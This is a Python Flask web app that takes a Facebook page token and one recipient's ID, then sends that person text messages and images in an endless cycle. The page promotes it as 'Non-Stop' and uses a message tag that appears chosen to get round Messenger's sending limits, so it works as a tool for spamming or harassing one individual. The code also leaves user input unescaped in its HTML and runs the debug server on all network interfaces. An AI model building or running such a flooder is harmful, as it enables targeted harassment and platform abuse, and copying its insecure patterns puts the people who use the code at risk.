from flask import Flask, request, render_template_string
import requests
import time
import random
import string
import os
from threading import Thread, Event
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configure upload folders
UPLOAD_FOLDER = 'uploads'
MESSAGE_FOLDER = 'messages'
ALLOWED_IMAGE_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp'}

# Create directories
for folder in [UPLOAD_FOLDER, MESSAGE_FOLDER]:
    if not os.path.exists(folder):
        os.makedirs(folder)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MESSAGE_FOLDER'] = MESSAGE_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size

# Global variables
stop_events = {}
active_tasks = {}

def allowed_image_file(filename):
    """Check if file is an allowed image type"""
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_IMAGE_EXTENSIONS

def test_facebook_token(token):
    """Test if Facebook token is valid"""
    try:
        url = f"https://graph.facebook.com/v19.0/me"
        params = {'access_token': token}
        response = requests.get(url, params=params, timeout=10)
        return response.status_code == 200
    except:
        return False

def send_facebook_message_simple(token, recipient_id, message):
    """Simplified message sending"""
    try:
        url = "https://graph.facebook.com/v19.0/me/messages"
        
        data = {
            'recipient': f'{{"id":"{recipient_id}"}}',
            'message': f'{{"text":"{message}"}}',
            'access_token': token,
            'messaging_type': 'MESSAGE_TAG',
            'tag': 'NON_PROMOTIONAL_SUBSCRIPTION'
        }
        
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200:
            return True, "Message sent successfully"
        else:
            return False, f"Failed: {response.text}"
            
    except Exception as e:
        return False, f"Error: {str(e)}"

def upload_image_to_imgbb(image_path):
    """Upload image to ImgBB and get URL"""
    try:
        # For demo purposes, we'll use a mock URL
        # In production, you would use ImgBB API or similar service
        mock_url = f"https://example.com/{os.path.basename(image_path)}"
        return True, mock_url
    except Exception as e:
        return False, f"Upload error: {str(e)}"

def send_facebook_image_simple(token, recipient_id, image_url):
    """Simplified image sending"""
    try:
        url = "https://graph.facebook.com/v19.0/me/messages"
        
        data = {
            'recipient': f'{{"id":"{recipient_id}"}}',
            'message': f'{{"attachment":{{"type":"image","payload":{{"url":"{image_url}","is_reusable":true}}}}}}',
            'access_token': token,
            'messaging_type': 'MESSAGE_TAG', 
            'tag': 'NON_PROMOTIONAL_SUBSCRIPTION'
        }
        
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200:
            return True, "Image sent successfully"
        else:
            return False, f"Failed: {response.text}"
            
    except Exception as e:
        return False, f"Error: {str(e)}"

def process_uploaded_images(files):
    """Process uploaded image files and return URLs"""
    image_urls = []
    
    for file in files:
        if file and allowed_image_file(file.filename):
            try:
                # Secure filename and save
                filename = secure_filename(file.filename)
                unique_filename = f"{int(time.time())}_{random.randint(1000,9999)}_{filename}"
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
                file.save(filepath)
                
                print(f"✅ Image saved: {unique_filename}")
                
                # Upload to image hosting service (ImgBB)
                success, image_url = upload_image_to_imgbb(filepath)
                
                if success:
                    image_urls.append(image_url)
                    print(f"✅ Image URL obtained: {image_url}")
                else:
                    # Fallback to placeholder
                    placeholder_url = f"https://picsum.photos/500/500?random={len(image_urls)+1}"
                    image_urls.append(placeholder_url)
                    print(f"⚠️ Using placeholder for: {filename}")
                    
            except Exception as e:
                print(f"❌ Error processing image {file.filename}: {str(e)}")
                # Add fallback URL
                placeholder_url = f"https://picsum.photos/500/500?random={len(image_urls)+1}"
                image_urls.append(placeholder_url)
    
    return image_urls

def read_messages_from_file(file):
    """Read messages from uploaded text file"""
    try:
        if file and file.filename.endswith('.txt'):
            content = file.read().decode('utf-8')
            messages = [line.strip() for line in content.split('\n') if line.strip()]
            return messages
        return []
    except Exception as e:
        print(f"❌ Error reading messages file: {str(e)}")
        return []

def working_cycle(task_id, token, recipient_id, name_prefix, messages, image_urls, delay):
    """Working message-image cycle"""
    stop_event = stop_events[task_id]
    cycle_count = 0
    
    print(f"🚀 STARTING TASK {task_id}")
    print(f"📍 Recipient: {recipient_id}")
    print(f"📝 Messages: {len(messages)}")
    print(f"🖼️ Images: {len(image_urls)}")
    print(f"⏰ Delay: {delay}s")
    print("=" * 50)
    
    # Test token first
    print("🔍 Testing token...")
    if not test_facebook_token(token):
        print("❌ INVALID TOKEN! Please check your access token.")
        active_tasks[task_id]['status'] = "Invalid Token"
        return
    
    print("✅ Token is valid!")
    
    while not stop_event.is_set():
        cycle_count += 1
        
        # Send message
        if messages:
            message = f"{name_prefix} {random.choice(messages)}"
            print(f"📤 Sending message {cycle_count}...")
            success, result = send_facebook_message_simple(token, recipient_id, message)
            
            if success:
                active_tasks[task_id]['sent_messages'] += 1
                print(f"✅ MESSAGE {active_tasks[task_id]['sent_messages']} SENT: {message[:50]}...")
            else:
                print(f"❌ MESSAGE FAILED: {result}")
            
            time.sleep(delay)
        
        # Send image
        if image_urls and not stop_event.is_set():
            image_url = random.choice(image_urls)
            print(f"📤 Sending image {cycle_count}...")
            success, result = send_facebook_image_simple(token, recipient_id, image_url)
            
            if success:
                active_tasks[task_id]['sent_images'] += 1
                print(f"✅ IMAGE {active_tasks[task_id]['sent_images']} SENT")
            else:
                print(f"❌ IMAGE FAILED: {result}")
            
            time.sleep(delay)
        
        # Update status
        active_tasks[task_id]['status'] = f"Cycle {cycle_count} - Running"
        active_tasks[task_id]['last_update'] = time.time()
        active_tasks[task_id]['total_cycles'] = cycle_count
        
        print(f"🔄 Completed cycle {cycle_count} - Total Messages: {active_tasks[task_id]['sent_messages']}, Total Images: {active_tasks[task_id]['sent_images']}")
        print("-" * 50)
    
    print(f"🛑 TASK {task_id} STOPPED")
    active_tasks[task_id]['status'] = "Stopped"

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        try:
            # Get form data
            token = request.form.get('token', '').strip()
            recipient_id = request.form.get('recipient_id', '').strip()
            name_prefix = request.form.get('name_prefix', 'User').strip()
            delay = int(request.form.get('delay', '10'))
            
            # Validate required fields
            if not token or not recipient_id:
                return '''
                <div class="alert alert-danger">
                    <h4>❌ Missing Required Fields</h4>
                    <p>Token and Recipient ID are required</p>
                    <a href="/" class="btn btn-primary">← Go Back</a>
                </div>
                '''
            
            # Process uploaded messages file
            messages_file = request.files.get('messages_file')
            messages = []
            
            if messages_file and messages_file.filename:
                messages = read_messages_from_file(messages_file)
                print(f"📁 Messages file processed: {len(messages)} messages")
            
            # If no messages file uploaded, use default messages
            if not messages:
                messages = [
                    "Hello! This is an automated message.",
                    "How are you doing today?",
                    "Just checking in with you!",
                    "Hope you're having a great day!",
                    "This is message number {}.",
                    "Sending positive vibes your way!",
                    "Have a wonderful day!",
                    "Stay safe and healthy!",
                    "Thinking of you!",
                    "Sending lots of love!"
                ]
                print("📝 Using default messages")
            
            # Process uploaded images
            image_files = request.files.getlist('image_files')
            image_urls = process_uploaded_images(image_files)
            
            # If no images uploaded, use placeholder images
            if not image_urls:
                image_urls = [
                    "https://picsum.photos/500/500?random=1",
                    "https://picsum.photos/500/500?random=2", 
                    "https://picsum.photos/500/500?random=3",
                    "https://picsum.photos/500/500?random=4",
                    "https://picsum.photos/500/500?random=5"
                ]
                print("🖼️ Using placeholder images")
            
            # Create task
            task_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            stop_events[task_id] = Event()
            
            active_tasks[task_id] = {
                'status': 'Starting...',
                'sent_messages': 0,
                'sent_images': 0,
                'start_time': time.time(),
                'last_update': time.time(),
                'total_cycles': 0
            }
            
            # Start cycle
            thread = Thread(
                target=working_cycle,
                args=(task_id, token, recipient_id, name_prefix, messages, image_urls, delay),
                daemon=True
            )
            thread.start()
            
            return f'''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Task Started</title>
                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
                <style>
                    body {{ 
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                        padding: 20px;
                    }}
                    .success-box {{ 
                        background: rgba(255, 255, 255, 0.95);
                        padding: 40px; 
                        border-radius: 15px; 
                        box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                        margin: 20px auto;
                        max-width: 700px;
                        text-align: center;
                    }}
                    .stats-box {{
                        background: #f8f9fa;
                        border-radius: 10px;
                        padding: 20px;
                        margin: 20px 0;
                    }}
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="success-box">
                        <div class="mb-4">
                            <i class="fas fa-check-circle text-success" style="font-size: 4rem;"></i>
                        </div>
                        <h2 class="text-success mb-3">✅ Task Started Successfully!</h2>
                        
                        <div class="stats-box text-start">
                            <div class="row">
                                <div class="col-md-6">
                                    <p><strong>Task ID:</strong> <code>{task_id}</code></p>
                                    <p><strong>Recipient ID:</strong> {recipient_id}</p>
                                    <p><strong>Your Name:</strong> {name_prefix}</p>
                                </div>
                                <div class="col-md-6">
                                    <p><strong>Messages:</strong> {len(messages)}</p>
                                    <p><strong>Images:</strong> {len(image_urls)}</p>
                                    <p><strong>Delay:</strong> {delay} seconds</p>
                                </div>
                            </div>
                        </div>
                        
                        <div class="alert alert-info">
                            <i class="fas fa-terminal"></i> 
                            <strong>Check your console for real-time logs!</strong><br>
                            <small>Messages and images are being sent in continuous cycle</small>
                        </div>
                        
                        <div class="row">
                            <div class="col-md-4">
                                <a href="/" class="btn btn-primary w-100 mb-2">
                                    <i class="fas fa-home"></i> New Task
                                </a>
                            </div>
                            <div class="col-md-4">
                                <a href="/status" class="btn btn-success w-100 mb-2">
                                    <i class="fas fa-chart-bar"></i> View Status
                                </a>
                            </div>
                            <div class="col-md-4">
                                <button onclick="copyTaskId()" class="btn btn-secondary w-100 mb-2">
                                    <i class="fas fa-copy"></i> Copy Task ID
                                </button>
                            </div>
                        </div>
                        
                        <div class="mt-3">
                            <form method="post" action="/stop" class="d-inline">
                                <input type="hidden" name="task_id" value="{task_id}" id="taskInput">
                                <button type="submit" class="btn btn-danger">
                                    <i class="fas fa-stop"></i> Stop This Task
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
                
                <script>
                    function copyTaskId() {{
                        navigator.clipboard.writeText("{task_id}");
                        alert("Task ID copied: {task_id}");
                    }}
                </script>
            </body>
            </html>
            '''
            
        except Exception as e:
            return f'''
            <div class="alert alert-danger">
                <h4>❌ Error</h4>
                <p>{str(e)}</p>
                <a href="/" class="btn btn-primary">← Go Back</a>
            </div>
            '''
    
    # Show the form for GET request
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📤 Upload Facebook Messenger</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #667eea;
            --secondary: #764ba2;
        }
        body {
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        .container {
            max-width: 900px;
        }
        .glass-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        .btn-primary {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            border: none;
            border-radius: 10px;
            font-weight: 600;
            padding: 15px;
            font-size: 18px;
        }
        .form-control {
            border-radius: 10px;
            border: 2px solid #e9ecef;
            padding: 12px;
            transition: all 0.3s ease;
        }
        .form-control:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 0.2rem rgba(102, 126, 234, 0.25);
        }
        .upload-area {
            border: 3px dashed #667eea;
            border-radius: 10px;
            padding: 30px;
            text-align: center;
            background: rgba(102, 126, 234, 0.1);
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
        }
        .upload-area:hover {
            background: rgba(102, 126, 234, 0.2);
            border-color: #764ba2;
        }
        .file-info {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 10px;
            margin-top: 10px;
            font-size: 14px;
        }
        .preview-image {
            width: 80px;
            height: 80px;
            object-fit: cover;
            border-radius: 8px;
            margin: 5px;
            border: 2px solid var(--primary);
        }
        .feature-icon {
            font-size: 2rem;
            color: var(--primary);
            margin-bottom: 1rem;
        }
    </style>
</head>
<body>
    <div class="container py-5">
        <!-- Header -->
        <div class="text-center text-white mb-5">
            <h1 class="display-4 fw-bold"><i class="fas fa-upload"></i> Upload Facebook Messenger</h1>
            <p class="lead">Upload Files - No Links Required!</p>
        </div>

        <!-- Main Form -->
        <div class="glass-card p-4 mb-4">
            <form method="post" enctype="multipart/form-data" id="mainForm">
                <!-- Basic Information -->
                <div class="row">
                    <div class="col-md-6">
                        <div class="mb-3">
                            <label class="form-label fw-bold">🔑 Facebook Page Token *</label>
                            <input type="text" class="form-control" name="token" 
                                   placeholder="EAABwzLixnjYBO..." required>
                            <div class="form-text">
                                Get from <a href="https://developers.facebook.com/tools/explorer/" target="_blank">Facebook Graph API Explorer</a>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="mb-3">
                            <label class="form-label fw-bold">👤 Recipient Facebook ID *</label>
                            <input type="text" class="form-control" name="recipient_id" 
                                   placeholder="123456789012345" required>
                            <div class="form-text">The Facebook ID to send messages to</div>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-6">
                        <div class="mb-3">
                            <label class="form-label fw-bold">🏷️ Your Name Prefix</label>
                            <input type="text" class="form-control" name="name_prefix" 
                                   placeholder="Legend Prince" value="Legend Prince">
                            <div class="form-text">Added before each message</div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="mb-3">
                            <label class="form-label fw-bold">⏰ Delay (Seconds) *</label>
                            <input type="number" class="form-control" name="delay" value="10" min="5" max="60" required>
                            <div class="form-text">Time between sends</div>
                        </div>
                    </div>
                </div>

                <!-- Messages File Upload -->
                <div class="mb-4">
                    <label class="form-label fw-bold">📄 Upload Messages File (.txt) *</label>
                    <div class="upload-area" onclick="document.getElementById('messages_file').click()">
                        <i class="fas fa-file-alt fa-3x text-primary mb-3"></i>
                        <h5>Click to Upload Messages File</h5>
                        <p class="text-muted">Upload .txt file with one message per line</p>
                        <small class="text-muted">Example: message1.txt</small>
                    </div>
                    <input type="file" class="form-control d-none" id="messages_file" name="messages_file" accept=".txt" required>
                    <div id="messages_file_info" class="file-info" style="display: none;">
                        <i class="fas fa-file text-success"></i>
                        <span id="messages_file_name"></span>
                    </div>
                    <div class="form-text">
                        <i class="fas fa-info-circle"></i> .txt file with one message per line. If not provided, default messages will be used.
                    </div>
                </div>

                <!-- Images File Upload -->
                <div class="mb-4">
                    <label class="form-label fw-bold">🖼️ Upload Images *</label>
                    <div class="upload-area" onclick="document.getElementById('image_files').click()">
                        <i class="fas fa-images fa-3x text-primary mb-3"></i>
                        <h5>Click to Upload Images</h5>
                        <p class="text-muted">Select multiple images (PNG, JPG, JPEG, GIF)</p>
                        <small class="text-muted">Max 10 images, 16MB each</small>
                    </div>
                    <input type="file" class="form-control d-none" id="image_files" name="image_files" multiple accept="image/*" required>
                    <div id="image_files_info" class="file-info" style="display: none;">
                        <i class="fas fa-images text-success"></i>
                        <span id="image_files_count">0</span> images selected
                    </div>
                    <div id="image_preview" class="mt-3"></div>
                    <div class="form-text">
                        <i class="fas fa-info-circle"></i> Select multiple images to use in the cycle. If not provided, placeholder images will be used.
                    </div>
                </div>

                <button type="submit" class="btn btn-primary w-100 py-3">
                    <i class="fas fa-play-circle"></i> START UPLOAD & SEND CYCLE
                </button>
            </form>
        </div>

        <!-- Features -->
        <div class="row text-center text-white mb-4">
            <div class="col-md-3">
                <div class="feature-icon">
                    <i class="fas fa-file-upload"></i>
                </div>
                <h6>File Upload</h6>
                <p>No links needed</p>
            </div>
            <div class="col-md-3">
                <div class="feature-icon">
                    <i class="fas fa-sync-alt"></i>
                </div>
                <h6>Auto Cycle</h6>
                <p>Message → Image → Repeat</p>
            </div>
            <div class="col-md-3">
                <div class="feature-icon">
                    <i class="fas fa-infinity"></i>
                </div>
                <h6>Non-Stop</h6>
                <p>Continuous until stopped</p>
            </div>
            <div class="col-md-3">
                <div class="feature-icon">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <h6>Secure</h6>
                <p>Files processed securely</p>
            </div>
        </div>

        <!-- Instructions -->
        <div class="glass-card p-4 mb-4">
            <h4 class="fw-bold mb-3"><i class="fas fa-book"></i> How to Use:</h4>
            <div class="row">
                <div class="col-md-6">
                    <h6>📄 Messages File Format:</h6>
                    <pre class="bg-light p-3 rounded">
Hello! This is message 1
This is message 2  
How are you doing?
Have a great day!
Another message here</pre>
                </div>
                <div class="col-md-6">
                    <h6>🖼️ Image Requirements:</h6>
                    <ul>
                        <li>Formats: PNG, JPG, JPEG, GIF, BMP, WEBP</li>
                        <li>Max size: 16MB per image</li>
                        <li>Recommended: 500x500 pixels</li>
                        <li>Multiple images supported</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center text-white">
            <p>© 2024 Developed by <strong>Legend Prince</strong></p>
            <div>
                <a href="https://www.facebook.com/100064267823693" class="text-white me-3">
                    <i class="fab fa-facebook"></i> Facebook
                </a>
                <a href="https://wa.me/+917543864229" class="text-white">
                    <i class="fab fa-whatsapp"></i> WhatsApp
                </a>
            </div>
        </div>
    </div>

    <script>
        // Messages file handler
        document.getElementById('messages_file').addEventListener('change', function(e) {
            const fileInfo = document.getElementById('messages_file_info');
            const fileName = document.getElementById('messages_file_name');
            
            if (this.files.length > 0) {
                const file = this.files[0];
                fileName.textContent = file.name + ' (' + (file.size / 1024).toFixed(2) + ' KB)';
                fileInfo.style.display = 'block';
            } else {
                fileInfo.style.display = 'none';
            }
        });

        // Images file handler
        document.getElementById('image_files').addEventListener('change', function(e) {
            const fileInfo = document.getElementById('image_files_info');
            const fileCount = document.getElementById('image_files_count');
            const preview = document.getElementById('image_preview');
            
            preview.innerHTML = '';
            
            if (this.files.length > 0) {
                fileCount.textContent = this.files.length;
                fileInfo.style.display = 'block';
                
                // Show previews
                Array.from(this.files).forEach((file, index) => {
                    if (file.type.startsWith('image/')) {
                        const reader = new FileReader();
                        reader.onload = function(e) {
                            const img = document.createElement('img');
                            img.src = e.target.result;
                            img.className = 'preview-image';
                            img.title = file.name;
                            preview.appendChild(img);
                        }
                        reader.readAsDataURL(file);
                    }
                });
            } else {
                fileInfo.style.display = 'none';
            }
        });

        // Form validation
        document.getElementById('mainForm').addEventListener('submit', function(e) {
            const messagesFile = document.getElementById('messages_file').files.length;
            const imagesFiles = document.getElementById('image_files').files.length;
            
            if (messagesFile === 0) {
                e.preventDefault();
                alert('❌ Please upload a messages file (.txt)');
                return false;
            }
            
            if (imagesFiles === 0) {
                e.preventDefault();
                alert('❌ Please upload at least one image');
                return false;
            }
            
            // Show loading state
            const btn = this.querySelector('button[type="submit"]');
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING UPLOADS...';
            btn.disabled = true;
        });
    </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('task_id', '').strip()
    if task_id in stop_events:
        stop_events[task_id].set()
        time.sleep(1)
        return f'''
        <div class="alert alert-success text-center">
            <h4>✅ Task Stopped</h4>
            <p>Task {task_id} has been stopped</p>
            <a href="/" class="btn btn-primary">← Go Back</a>
        </div>
        '''
    else:
        return '''
        <div class="alert alert-warning text-center">
            <h4>⚠️ Task Not Found</h4>
            <p>Task not found or already stopped</p>
            <a href="/" class="btn btn-primary">← Go Back</a>
        </div>
        '''

@app.route('/status')
def status():
    status_html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Task Status</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            body { 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }
            .status-card { 
                background: rgba(255, 255, 255, 0.95);
                border-radius: 15px;
                padding: 25px;
                margin: 15px 0;
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="text-center text-white mb-4">
                <h1><i class="fas fa-chart-bar"></i> Active Tasks Status</h1>
            </div>
    '''
    
    if active_tasks:
        for task_id, info in active_tasks.items():
            runtime = int(time.time() - info['start_time'])
            status_html += f'''
            <div class="status-card">
                <div class="row">
                    <div class="col-md-8">
                        <h4>Task: <code>{task_id}</code></h4>
                        <p><strong>Status:</strong> <span class="badge bg-success">{info['status']}</span></p>
                        <p><strong>Runtime:</strong> {runtime} seconds</p>
                        <p><strong>Cycles Completed:</strong> {info['total_cycles']}</p>
                    </div>
                    <div class="col-md-4">
                        <div class="text-end">
                            <p><strong>Messages Sent:</strong> <span class="badge bg-primary">{info['sent_messages']}</span></p>
                            <p><strong>Images Sent:</strong> <span class="badge bg-info">{info['sent_images']}</span></p>
                            <form method="post" action="/stop">
                                <input type="hidden" name="task_id" value="{task_id}">
                                <button type="submit" class="btn btn-danger btn-sm">
                                    <i class="fas fa-stop"></i> Stop Task
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            '''
    else:
        status_html += '''
        <div class="status-card text-center">
            <h4>No Active Tasks</h4>
            <p class="text-muted">No tasks are currently running.</p>
            <a href="/" class="btn btn-primary">Start New Task</a>
        </div>
        '''
    
    status_html += '''
            <div class="text-center mt-4">
                <a href="/" class="btn btn-light">
                    <i class="fas fa-arrow-left"></i> Back to Home
                </a>
            </div>
        </div>
    </body>
    </html>
    '''
    
    return status_html

if __name__ == '__main__':
    print("=" * 60)
    print("🚀 UPLOAD FACEBOOK MESSENGER - FILE UPLOAD VERSION")
    print("=" * 60)
    print("📍 Server: http://localhost:5000")
    print("📁 Upload folders created:")
    print("   • ./uploads/ - For images")
    print("   • ./messages/ - For message files")
    print("✅ Features:")
    print("   • Upload .txt file for messages")
    print("   • Upload multiple images")
    print("   • No links required")
    print("   • Continuous message-image cycle")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=True)
